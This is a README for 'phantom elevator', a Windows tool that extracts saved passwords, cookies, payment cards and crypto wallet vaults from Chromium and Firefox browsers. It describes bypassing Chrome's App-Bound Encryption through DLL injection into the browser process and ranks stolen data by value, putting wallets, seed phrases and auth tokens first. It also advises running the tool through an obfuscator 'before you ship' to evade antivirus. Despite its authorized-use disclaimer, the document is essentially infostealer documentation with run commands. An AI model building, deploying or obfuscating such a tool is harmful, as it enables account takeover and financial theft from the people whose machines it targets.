<div align="center">

# 👻 phantom elevator

### Multi-Browser Credential Extraction · App-Bound Encryption Bypass

*Walk Chromium and Firefox profile stores, recover the plaintext, rank what matters.*

<br>

<a href="https://github.com/Hidden-Rhythm/abe-bypass">
  <img src="https://img.shields.io/badge/💻_Source-GitHub-18181b?style=for-the-badge&logo=github&logoColor=white" alt="GitHub Source">
</a>
<img src="https://img.shields.io/badge/🐍_Python-3.10%2B-3776AB?style=for-the-badge&logo=python&logoColor=white" alt="Python 3.10+">
<img src="https://img.shields.io/badge/🪟_Windows-10%20%7C%2011-0078D6?style=for-the-badge&logo=windows11&logoColor=white" alt="Windows 10/11">
<img src="https://img.shields.io/badge/Version-1.0.0-52525b?style=for-the-badge" alt="Version 1.0.0">

<br><br>

**DPAPI + V20 BYPASS** &nbsp;·&nbsp; **COM ELEVATION BRIDGE** &nbsp;·&nbsp; **SIGNAL-FIRST RANKING**

<br>

[**⚠️ Authorized Use**](#authorized-use) · [**🚀 Quickstart**](#quickstart) · [**🖥️ CLI**](#cli) · [**🌐 Browsers**](#browsers) · [**⚡ Bypass**](#bypass) · [**🛡️ Obfuscation**](#obfuscation) · [**⚠️ Limitations**](#limitations)

</div>

---

## 🎯 What Is Phantom Elevator?

**phantom elevator** is a Windows credential extractor built for the post-ABE era. It walks Chromium and Firefox profile directories, locates every encrypted secret store, and recovers the plaintext — including the **v20 App-Bound Encryption** keys that broke every legacy DPAPI-only extractor.

It is a single-file Python application. No service to install, no driver to sign, no agent to persist.

> 🎯 **The goal:** point it at a machine, let it detect what is installed, and read the output.

<br>

<table>
<tr>
<td width="33%" valign="top">

**🎯 Detect**
Enumerates Chromium and Firefox families from standard install paths. Missing browsers are skipped, not fatal.

</td>
<td width="33%" valign="top">

**🔓 Recover**
Resolves each browser's key store — `v10` via DPAPI, `v20` via an in-process elevation bridge compiled at runtime.

</td>
<td width="33%" valign="top">

**📊 Rank**
Scores every local-storage entry before writing. Wallets, tokens, and seed phrases lead the output.

</td>
</tr>
</table>

---

<a id="authorized-use"></a>
## ⚠️ Authorized Use Only

<table>
<tr>
<td width="100%" valign="top">

**✅ Legitimate uses**

- Authorized penetration testing engagements with a signed scope
- Red-team assessments of your own systems
- Digital forensics on a device you own or have legal custody of
- Incident response triage on a compromised endpoint
- CTF challenges and security research on test machines you control
- Personal account recovery on a machine you own

**❌ Illegal uses**

- Extracting credentials from any device you do not own
- Any form of credential theft, account takeover, or unauthorized access
- Deploying on a victim's machine, through malware, phishing, or social engineering
- Commercial sale of extracted credentials
- Any use that violates the Computer Fraud and Abuse Act, the Computer Misuse Act, GDPR, CFAA § 1030, or local law

</td>
</tr>
</table>

> 🚨 **YOU ARE RESPONSIBLE FOR YOUR OWN USE.** This software is published for authorized security research and educational analysis only. The author does **not** condone, support, or facilitate unauthorized access to computer systems. If you use Phantom Elevator against a system you are not explicitly authorized to test, **you** commit a crime and **you alone** bear the legal consequence.

> 📜 **NO WARRANTY, NO LIABILITY.** This software is provided "as is", without warranty of any kind, express or implied. The author is not liable for any damages, legal action, or consequence arising from use or misuse. See [LICENSE](LICENSE).

> 🤝 **REPORTING A VULNERABILITY.** If you are a browser vendor or security researcher who has found a flaw this tool touches, contact the author via Discord — responsible disclosure is welcome, abuse is not.

---

<a id="chain"></a>
## 🔗 The Chain That Broke

For years, credential tooling relied on one chain:

```text
Local State  →  encrypted_key (v10)  →  CryptUnprotectData  →  AES-256-GCM  →  plaintext
```

That chain still works — for `v10`.

Chrome 127 introduced **App-Bound Encryption** 🔒. The master key is now sealed inside a COM elevation service that only the browser's own signed process is supposed to reach. DPAPI returns ciphertext. The old chain dead-ends.

---

<a id="bypass"></a>
## ⚡ The ABE Problem

Phantom Elevator adds the missing bridge.

```text
Local State  →  encrypted_key (v20)  →  elevation-service bridge  →  master key  →  AES-256-GCM  →  plaintext
```

<br>

<details open>
<summary><b>⚙️ The bypass, step by step</b></summary>

<br>

```text
phantom_elevator.py
        │
        ├─ 01. Parse Local State → os_crypt.app_bound_encrypted_key
        │
        ├─ 02. Verify the APPB prefix, strip it, keep the sealed blob
        │
        ├─ 03. Compile a tiny C DLL
        │        CLSID + IID_V1 + IID_V2 + vtable offset for the target browser
        │
        ├─ 04. Ensure the browser's elevation service is RUNNING
        │
        ├─ 05. Launch browser --version in a sandboxed TEMP
        │        OpenProcess → VirtualAllocEx → WriteProcessMemory
        │        → CreateRemoteThread(LoadLibraryW)
        │
        ├─ 06. DLL: CoCreateInstance(ElevationService, CLSCTX_LOCAL_SERVER)
        │        → vtable decrypt slot → ph_out.bin
        │
        └─ 07. Python reads the 32-byte key → AES-256-GCM decrypts
                 🍪 cookies · 🔑 passwords · 💳 cards
```

</details>

<br>

Each supported Chromium build ships its own `cls_id`, `iid_v1` / `iid_v2`, elevation service name, and `vtable_offset` — all carried in the `BROWSERS` table. The DLL is compiled at runtime with MinGW-w64 `gcc` or MSVC `cl`, whichever is found. If neither is present, the ABE path disables itself and `v10` extraction continues.

---

<a id="browsers"></a>
## 🌐 Supported Browsers

### 🔵 Chromium family

| | Browser | Key protection | ABE bridge |
|:---:|:---|:---|:---:|
| <img src="https://www.google.com/s2/favicons?domain=google.com&sz=64" height="18"> | **Google Chrome** | DPAPI + ABE | ✅ |
| <img src="https://www.google.com/s2/favicons?domain=google.com&sz=64" height="18"> | Chrome Beta | DPAPI + ABE | ✅ |
| <img src="https://www.google.com/s2/favicons?domain=brave.com&sz=64" height="18"> | **Brave** | DPAPI + ABE | ✅ |
| <img src="https://www.google.com/s2/favicons?domain=microsoft.com&sz=64" height="18"> | Microsoft Edge | DPAPI + ABE | ✅ |
| <img src="https://www.google.com/s2/favicons?domain=avast.com&sz=64" height="18"> | Avast Secure Browser | DPAPI + ABE | ✅ |
| <img src="https://www.google.com/s2/favicons?domain=vivaldi.com&sz=64" height="18"> | Vivaldi | DPAPI | ➖ |
| <img src="https://www.google.com/s2/favicons?domain=chromium.org&sz=64" height="18"> | Chromium | DPAPI | ➖ |
| <img src="https://www.google.com/s2/favicons?domain=opera.com&sz=64" height="18"> | Opera | DPAPI | ➖ |
| <img src="https://www.google.com/s2/favicons?domain=opera.com&sz=64" height="18"> | Opera GX | DPAPI | ➖ |

### 🦊 Firefox family

| | Browser | Key protection | Status |
|:---:|:---|:---|:---:|
| <img src="https://www.google.com/s2/favicons?domain=mozilla.org&sz=64" height="18"> | **Firefox** | NSS / `key4.db` | ✅ |
| <img src="https://www.google.com/s2/favicons?domain=waterfox.net&sz=64" height="18"> | Waterfox | NSS / `key4.db` | ✅ |
| <img src="https://www.google.com/s2/favicons?domain=librewolf.net&sz=64" height="18"> | LibreWolf | NSS / `key4.db` | ✅ |
| <img src="https://www.google.com/s2/favicons?domain=floorp.app&sz=64" height="18"> | Floorp | NSS / `key4.db` | ✅ |
| <img src="https://www.google.com/s2/favicons?domain=zen-browser.app&sz=64" height="18"> | Zen Browser | NSS / `key4.db` | ✅ |

<sub>💡 Installation is detected automatically from standard `%LocalAppData%`, `%AppData%`, and `%ProgramFiles%` paths. Missing browsers are skipped, not fatal.</sub>

---

## 📦 Extraction Matrix

<table>
<tr>
<th></th>
<th align="left">Category</th>
<th align="left">Flag</th>
<th align="left">Chromium source</th>
<th align="left">Firefox source</th>
</tr>
<tr><td>🍪</td><td><b>Cookies</b></td><td><code>--cookies</code></td><td><code>Network/Cookies</code></td><td><code>cookies.sqlite</code></td></tr>
<tr><td>🔑</td><td><b>Passwords</b></td><td><code>--passwords</code></td><td><code>Login Data</code></td><td><code>logins.json</code></td></tr>
<tr><td>📜</td><td>History</td><td><code>--history</code></td><td><code>History</code></td><td><code>places.sqlite</code></td></tr>
<tr><td>📝</td><td>Autofill</td><td><code>--autofill</code></td><td><code>Web Data</code></td><td>—</td></tr>
<tr><td>💳</td><td><b>Cards &amp; IBANs</b></td><td><code>--cards</code></td><td><code>Web Data</code></td><td>—</td></tr>
<tr><td>🗂️</td><td>Local Storage</td><td><code>--local-storage</code></td><td><code>Local Storage/leveldb</code></td><td>—</td></tr>
<tr><td>🔖</td><td>Bookmarks</td><td><code>--bookmarks</code></td><td><code>Bookmarks</code></td><td><code>places.sqlite</code></td></tr>
<tr><td>🧩</td><td>Extensions</td><td><code>--extensions</code></td><td><code>Extensions/</code></td><td>—</td></tr>
<tr><td>🪙</td><td><b>Wallets</b></td><td><code>--wallets</code></td><td>extension storage</td><td>—</td></tr>
<tr><td>👤</td><td>Account</td><td><i>always</i></td><td><code>Preferences</code> / <code>Local State</code></td><td><code>signedInUser.json</code></td></tr>
</table>

<sub>💡 No category flag selected = every category. Account metadata is always written when signed-in data is present.</sub>

---

<a id="signal"></a>
## 📡 Signal-First Filtering

> A raw dump is noise. `--important` keeps only the entries that matter — crypto, finance, identity, and developer hosts.

**🏦 High-value hosts** — from `_IMP_HOSTS`:

```text
MetaMask · Phantom · Coinbase · Binance · Kraken · OKX · KuCoin · Bybit
Uniswap · Aave · OpenSea · WalletConnect · Ledger · Trezor · Trust Wallet
accounts.google.com · login.microsoftonline.com · github.com · gitlab.com
Auth0 · Okta · Discord · Slack
```

**🔑 High-value keys** — matched by `_IMP_KEY_PAT`:

`token` `jwt` `session` `auth` `api_key` `secret` `passw` `private_key` `privatekey` `seed` `mnemonic` `wallet` `keystore` `signer` `phrase`

**💎 High-value values** — matched by `_IMP_VAL_PAT`:

seed phrases · `0x` private keys (40–64 hex) · Bech32 `bc1…` · base58 Bitcoin addresses

`--important` applies to cookies, passwords, history, and local storage. Anything filtered out lands in the `--debug-drops` breakdown as `skipped_not_important`.

---

<a id="quickstart"></a>
## 🚀 Getting Started

### 📋 Requirements

- 🪟 Windows **10 / 11**, x64
- 🐍 Python **3.10 or later**
- 🔨 MinGW-w64 `gcc` or MSVC `cl` — optional; enables the ABE / v20 path
- 🌐 Network on first run, for dependency bootstrap

Dependencies resolve automatically on launch:

| Package | Purpose |
|:---|:---|
| `pycryptodome` | AES-256-GCM |
| `python-snappy` | LevelDB block decompression (falls back to built-in decoder) |
| `gcc` | attempted via `winget`, `choco`, then `scoop` |

If no compiler can be installed, the tool prints a warning and continues in `v10`-only mode.

### 1️⃣ Clone

```bash
git clone https://github.com/Hidden-Rhythm/abe-bypass.git
cd abe-bypass
```

### 2️⃣ Run

```bash
python phantom_elevator.py
```

### 3️⃣ Read the Output

```text
out/
├── Chrome/
│   └── Default/
│       ├── cookies/          → one Netscape .txt per host
│       ├── passwords/        → one TSV .txt per domain
│       ├── history.txt
│       ├── autofill.txt
│       ├── credit_cards.txt
│       ├── local_storage/    → one readable .txt per origin
│       ├── bookmarks.txt
│       ├── extensions.txt
│       └── account.txt
└── Firefox/
    └── <profile>/
        ├── cookies/
        ├── passwords/
        ├── history.txt
        ├── bookmarks.txt
        └── account.txt
```

Full flag surface, recipes, and exit codes: [🖥️ CLI Reference](#cli).

---

## 📂 Input & Output

Phantom Elevator discovers profile directories on its own. `--target` narrows to one browser; `-o` changes the output root.

**Example input**

```text
C:\Users\<name>\AppData\Local\Google\Chrome\User Data\Default\
```

**Default output root**

```text
out\
```

### 📄 Output files

Every format writes plain-text unless you ask for `json` or `csv`. Default is `--format tsv`.

| Artifact | Default (`tsv`) | `--format csv` | `--format json` |
|:---|:---|:---|:---|
| 🍪 Cookies | `cookies/<host>.txt` (Netscape) | `cookies.csv` | `cookies.json` |
| 🔑 Passwords | `passwords/<domain>.txt` (TSV) | `passwords.csv` | `passwords.json` |
| 📜 History | `history.txt` | `history.csv` | `history.json` |
| 📝 Autofill | `autofill.txt` + `autofill_profiles.txt` | `autofill.csv` + `autofill_profiles.csv` | `autofill.json` |
| 💳 Cards | `credit_cards.txt` + `ibans.txt` | `credit_cards.csv` + `ibans.csv` | `cards.json` |
| 🗂️ Local Storage | `local_storage/<host>.txt` | `local_storage.csv` | `local_storage.json` |
| 🔖 Bookmarks | `bookmarks.txt` | `bookmarks.csv` | `bookmarks.json` |
| 🧩 Extensions | `extensions.txt` (JSON inside) + `extensions/<id>/` | `extensions.csv` | `extensions.txt` |
| 🪙 Wallets | `wallets/<name>/vault.json` + raw dumps | same | same |
| 👤 Account | `account.txt` | `account.txt` | `account.txt` |

<sub>💡 <code>--format txt</code> is accepted and aliased to <code>tsv</code>. <code>extensions.txt</code> and <code>account.txt</code> are always written regardless of format. Cards are masked in the console but written in full to disk.</sub>

---

<a id="cli"></a>
## 🖥️ Command Line

Every flag is optional. With no arguments, Phantom Elevator detects browsers, runs every category, and writes to `out\`.

```bash
python phantom_elevator.py [OPTIONS]
```

<br>

### 📦 Categories

| Flag | What it does |
|:---|:---|
| `--all` | Explicitly select every category (same as passing none) |
| `--cookies` | 🍪 HTTP cookies |
| `--passwords` | 🔑 Saved logins |
| `--history` | 📜 Browsing history |
| `--autofill` | 📝 Form autofill fields and profiles |
| `--cards` | 💳 Credit cards and IBANs |
| `--local-storage` | 🗂️ Local Storage leveldb entries |
| `--bookmarks` | 🔖 Bookmarks |
| `--extensions` | 🧩 Installed extensions and their storage |
| `--wallets` | 🪙 Wallet vault extraction and raw dumps |

<sub>💡 Category flags are boolean switches, not key/value pairs. Combine as many as you want: <code>--cookies --passwords --cards</code>.</sub>

<br>

### 🎛️ Run Control

| Flag | Argument | Default | What it does |
|:---|:---|:---|:---|
| `-o`, `--output` | `DIR` | `out` | 📁 Output directory. Created if missing. |
| `-t`, `--target` | `NAME` | *(all)* | 🎯 Only this browser. Lowercased before matching — `chrome`, `brave`, `edge`, `avast`, `vivaldi`, `chromium`, `opera`, `opera gx`, `firefox`, `waterfox`, `librewolf`, `floorp`, `zen`. |
| `--force-kill` | — | off | 🔪 Terminate browsers before extraction. Use when profiles are locked. |
| `--wallet-password` | `PW` | `$PE_WALLET_PW` | 🔐 Wallet vault password. Falls back to the `PE_WALLET_PW` env var. |
| `--no-wallet-prompt` | — | off | 🙅 Never prompt for a wallet password. |
| `--jobs` | `N` | `1` | ⚡ Parallel browser jobs. `1` = sequential with live streaming output. |

<br>

### 🧭 Modes

These short-circuit extraction and exit immediately.

| Flag | What it does |
|:---|:---|
| `--list-browsers` | 🌐 List detected browsers, profile counts, and ABE service state. |
| `--list-wallets` | 🪙 List supported wallet extensions, schemes, hashcat modes, and IDs. |
| `--audit-only` | 🩺 Read-only browser/profile and SQLite health audit. No bootstrap, no secrets read, no files modified. |
| `--install-launchers` | 📜 Write `pe.bat` and `pe-admin.bat` next to the script. |

<br>

### 🎨 Output

| Flag | Argument | Default | What it does |
|:---|:---|:---|:---|
| `--format` | `tsv` \| `json` \| `csv` \| `txt` | `tsv` | 🗄️ Output format. `tsv` and `txt` both write plain-text `.txt` files; `csv` and `json` switch to structured files. |
| `--important` | — | off | 💎 Only high-value targets — crypto, finance, auth, and developer hosts, plus key-shaped local-storage entries. |
| `--debug-drops` | — | off | 🔍 Print the skipped-entry breakdown: what was dropped, why, and per-reason counts. |
| `--no-color` | — | off | ⚪ Disable ANSI colors. Auto-enabled when stdout is not a TTY on non-Windows. |
| `-v`, `--verbose` | — | off | 📋 Per-entry sample output in the drops table. Also prints tracebacks on job failure. |
| `-q`, `--quiet` | — | off | 🤫 Suppress the banner and progress. Errors still print. |

<br>

### 🧾 Recipes

**👻 Everything, default text output**
```bash
python phantom_elevator.py
```

**🔪 Everything, close browsers first (unlocks locked DBs)**
```bash
python phantom_elevator.py --force-kill
```

**🍪 Just cookies and passwords**
```bash
python phantom_elevator.py --cookies --passwords
```

**💳 Cards and autofill only**
```bash
python phantom_elevator.py --cards --autofill
```

**🪙 Wallets, prompt for password**
```bash
python phantom_elevator.py --wallets
```

**🪙 Wallets, password supplied non-interactively**
```bash
python phantom_elevator.py --wallets --wallet-password 'my pass'
```

**🪙 Wallets, password via environment variable**
```bash
set PE_WALLET_PW=my pass
python phantom_elevator.py --wallets --no-wallet-prompt
```

**💎 High-value targets only, everything**
```bash
python phantom_elevator.py --important
```

**🗄️ Everything as JSON**
```bash
python phantom_elevator.py --format json
```

**🗄️ Everything as CSV**
```bash
python phantom_elevator.py --format csv
```

**🎯 Chrome only, into a custom folder**
```bash
python phantom_elevator.py -t chrome -o C:\Users\dj\Desktop\drop
```

**🎯 Opera GX only (note the space)**
```bash
python phantom_elevator.py -t "opera gx"
```

**⚡ Four browsers in parallel**
```bash
python phantom_elevator.py --jobs 4
```

**🩺 Read-only health check**
```bash
python phantom_elevator.py --audit-only
```

**🌐 What is installed here?**
```bash
python phantom_elevator.py --list-browsers
```

**🪙 Which wallets are supported?**
```bash
python phantom_elevator.py --list-wallets
```

**📜 Create the launcher scripts**
```bash
python phantom_elevator.py --install-launchers
```

**🔍 Investigate silent drops**
```bash
python phantom_elevator.py --debug-drops -v
```

<br>

### 🚦 Exit codes

| Code | Meaning |
|:---:|:---|
| `0` | ✅ Run completed cleanly — no failed jobs, no skipped profiles, no locked databases. `--audit-only` also returns `0` when every database passes `quick_check`. |
| `1` | ⚠️ Partial or failed run — one or more jobs failed, profiles were skipped, or a profile database could not be copied. Also returned for: non-Windows host, empty `--output`, no categories selected, failed audit integrity check, or a launcher write error. |
| `2` | 🚫 Nothing ran — no browsers matched `--target`, or no job completed successfully. |
| `130` | 🛑 Interrupted with `Ctrl+C`. |

<br>

<details>
<summary><b>🔧 When a new browser build breaks ABE</b></summary>

<br>

Run the failing browser through a verbose single-browser pass:

```bash
python phantom_elevator.py -t chrome --cookies --debug-drops -v
```

Every ABE failure lands in the drops table as a `crypto` or `abe` reason — `no_local_state`, `no_abe_key_in_state`, `bad_abe_prefix`, `service_unavailable`, `compile_failed`, `inject_failed`, `bad_key_length`. The DLL itself writes `ph_err.txt` into the sandbox on a decryption failure; that message carries the exact `CoCreateInstance` or `Decrypt` HRESULT.

When you need to update the table, these are the four values in the `BROWSERS` entry that move between Chromium major releases:

| Field | What it is |
|:---|:---|
| `cls_id` | The elevation service CLSID |
| `iid_v1` | Interface IID tried first |
| `iid_v2` | Interface IID tried second (blank = skip) |
| `vtable_offset` | Byte offset into the vtable; divided by 8 for the slot index |

Also check `services` — the elevation service name — and confirm it is `RUNNING` with `--list-browsers`.

</details>

---

<a id="obfuscation"></a>
## 🛡️ Hardening the Payload

> **Obfuscate before you ship.** Phantom Elevator is a single-file Python application — a drop-in target for the [**Hidden-Rhythm obfuscator**](https://github.com/Hidden-Rhythm/obfuscator) pipeline.

```text
              ┌──────────────────────────┐
              │     01. Read Source      │
              └────────────┬─────────────┘
                           ▼
              ┌──────────────────────────┐
              │ 02. Encrypt Constants    │
              └────────────┬─────────────┘
                           ▼
              ┌──────────────────────────┐
              │    03. Build Payload     │
              └────────────┬─────────────┘
                           ▼
              ┌──────────────────────────┐
              │    04. Build Stage 2     │
              └────────────┬─────────────┘
                           ▼
              ┌──────────────────────────┐
              │   05. Build Bootstrap    │
              └────────────┬─────────────┘
                           ▼
              ┌──────────────────────────┐
              │    06. Emit Surface      │
              └────────────┬─────────────┘
                           ▼
              ┌──────────────────────────┐
              │    07. Verify Syntax     │
              └────────────┬─────────────┘
                           ▼
              ┌──────────────────────────┐
              │     08. Write Output     │
              └──────────────────────────┘
```

### ▶️ Run it

```bash
git clone https://github.com/Hidden-Rhythm/obfuscator.git
cd obfuscator
python -m pip install rich
python obfuscator.py
```

When prompted, provide the path to `phantom_elevator.py`. Accept the default output name, `phantom_elevator_obf.py`.

<br>

| Layer | Effect |
|:---|:---|
| 🌳 AST transformation | restructures eligible syntax-tree nodes |
| 🔐 Constant encoding | XOR-encodes strings and byte constants |
| 📦 Payload serialization | compiles to a `marshal` code object |
| 🗜️ Compression | `zlib` + base64 chunking |
| 🚀 Layered loader | bootstrap and runtime-loading stages |
| 🎭 Generated identifiers | breaks static symbol matching |
| ✅ Syntax verification | compiles the output before writing |

<br>

> 💡 The generated payload uses `marshal`-serialized code objects, which are Python-version dependent. Build and run on the **same interpreter version**. The obfuscator's runtime environment checks can affect execution in unusual sandboxes — test the generated file before deploying it.

The obfuscator also reports a SHA-256 build fingerprint and per-stage timings, so every hardened build is traceable to its source.

---

## 🏗️ Architecture

```text
┌─────────────────────────────────────────────────────────────┐
│                     PHANTOM ELEVATOR                        │
│                   single-file Python app                    │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   Browser discovery                                         │
│        │                                                    │
│        ├── Chromium profiles ──┐                            │
│        └── Firefox profiles ───┤                            │
│                                ▼                            │
│                     Profile walker                          │
│                                │                            │
│              ┌─────────────────┼─────────────────┐          │
│              ▼                 ▼                 ▼          │
│          SQLite reader     LevelDB reader    NSS reader     │
│              │                 │                 │          │
│              └─────────────────┼─────────────────┘          │
│                                ▼                            │
│                     Key recovery layer                      │
│              ┌─────────────────┴─────────────────┐          │
│              ▼                                   ▼          │
│        DPAPI (v10)                        ABE bridge (v20)  │
│        CryptUnprotectData                 COM + DLL inject  │
│              └─────────────────┬─────────────────┘          │
│                                ▼                            │
│                     AES-256-GCM decrypt                     │
│                                │                            │
│                                ▼                            │
│               .txt · .csv · .json output                    │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## 🔬 Technical Details

| Component | Implementation |
|---|---|
| 🐍 Language | Python 3.10+ |
| 🔧 ABE bridge | C (MinGW-w64 `gcc` / MSVC `cl`) |
| 🔓 Key unprotection | DPAPI `CryptUnprotectData` + AES-256-GCM |
| ⚡ ABE access | COM elevation service + DLL injection |
| 🎯 Injection primitives | `OpenProcess` · `VirtualAllocEx` · `WriteProcessMemory` · `CreateRemoteThread` |
| 🗄️ LevelDB parsing | Built-in log/table reader, `python-snappy` when available |
| 🔐 Crypto | `pycryptodome` |
| 🍪 Cookie serialization | Netscape |
| 🔑 Password serialization | TSV |
| 🪙 Wallet vaults | MetaMask, Phantom, Coinbase, Rabby, Trust + 14 generic |
| 🧾 Build fingerprint | SHA-256 (via obfuscator) |

<a id="limitations"></a>
### ⚠️ Compatibility & Limitations

- 🪟 **Windows only.** The ABE bridge and DPAPI calls are Win32-specific.
- 🔄 **ABE is per-build.** Chromium CLSIDs, IIDs, service names, and vtable offsets change across browser releases. The `BROWSERS` table in the script is the source of truth — update it when a target ships a new elevation service.
- 🔨 **Compiler required for v20.** Without `gcc` or `cl`, the ABE path is disabled. `v10` and Firefox extraction still run.
- 🔒 **Running browsers may lock stores.** SQLite and LevelDB files can be held open. Close the target browser, or use `--force-kill`.
- 🛡️ **Antivirus is expected to react.** DLL injection and credential access are high-signal behaviors. The obfuscator layer raises static-analysis cost; it does not make the runtime behavior invisible.
- 🧬 **Obfuscator output is version-bound.** Generate and execute on the same Python minor version.
- 🦊 **Firefox passwords need NSS.** `nss3.dll` must be findable — it ships with every installed Firefox-family browser and is located automatically.

Test generated output thoroughly before using it in a production workflow.

---

## 🗂️ Project Structure

```text
abe-bypass/
└── phantom_elevator.py
```

The entire application — browser tables, DPAPI layer, ABE compiler, injector, profile walkers, wallet decryptors, and output writers — lives in one file. No package tree, no build step, no external config.

---

## 🛠️ Built With

| Technology | Purpose |
|---|---|
| 🐍 Python | Core application and extraction pipeline |
| 🔐 DPAPI | `v10` key unprotection |
| ⚡ COM | Elevation-service access for `v20` |
| 📦 `pycryptodome` | AES-256-GCM decryption |
| 🗜️ `python-snappy` | LevelDB block decompression |
| 🎨 ANSI | Terminal banner, spinner, and summary box |

---

## 🔗 Links

<div align="center">

<a href="https://github.com/Hidden-Rhythm/abe-bypass">
  <img src="https://img.shields.io/badge/Repository-View%20Source-18181b?style=for-the-badge&logo=github&logoColor=white" alt="View Repository">
</a>

<a href="https://github.com/Hidden-Rhythm/obfuscator">
  <img src="https://img.shields.io/badge/Companion-obfuscator-52525b?style=for-the-badge&logo=github&logoColor=white" alt="Obfuscator">
</a>

<a href="https://github.com/Hidden-Rhythm">
  <img src="https://img.shields.io/badge/Developer-Hidden--Rhythm-52525b?style=for-the-badge&logo=github&logoColor=white" alt="Developer Profile">
</a>

<a href="https://discord.com/users/hidden_rhythm">
  <img src="https://img.shields.io/badge/Discord-hidden__rhythm-5865F2?style=for-the-badge&logo=discord&logoColor=white" alt="Discord">
</a>

</div>

---

<div align="center">

### 👻 Built with Python.

**Hidden-Rhythm**

<sub>phantom elevator · v1.0.0 · ABE bypass · 13 browser families</sub>

</div>
